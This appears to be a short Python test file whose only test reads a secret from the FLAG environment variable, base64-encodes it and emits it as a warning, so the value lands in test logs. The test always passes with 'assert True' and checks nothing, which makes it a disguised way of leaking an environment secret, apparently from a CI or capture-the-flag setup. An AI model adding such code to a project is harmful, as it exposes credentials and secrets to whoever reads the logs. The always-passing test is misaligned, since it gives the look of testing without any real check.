# tests/test_leak_flag.py
import os, base64, warnings

def test_leak_flag():
    flag = os.environ.get("FLAG", "")
    if not flag:
        assert True
        return

    encoded = base64.b64encode(flag.encode()).decode()
    warnings.warn(f"FLAG_b64={encoded}")
    assert True
